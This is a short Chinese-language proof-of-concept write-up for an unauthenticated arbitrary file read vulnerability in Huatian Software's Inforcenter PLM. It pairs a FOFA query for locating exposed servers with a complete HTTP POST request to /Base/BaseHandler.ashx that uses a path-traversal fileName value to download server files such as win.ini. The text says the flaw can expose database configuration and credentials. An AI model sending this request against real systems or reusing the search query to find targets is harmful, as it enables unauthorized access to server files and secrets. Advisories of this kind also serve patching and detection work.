## 华天软件 Inforcenter PLM 任意文件读取漏洞

## 漏洞描述
华天软件 Inforcenter PLM 系统存在任意文件读取漏洞，未经身份验证的攻击者可直接下载服务器文件，泄露数据库配置、凭据等关键数据。

## 网络空间测绘
```
fofa: body="/Base/BaseHandler.ashx"
```

## POC
```
POST /Base/BaseHandler.ashx HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

type=downloadFile&extensionName=config&fileName=../../windows/win.ini
```

## 参考
- 社区情报

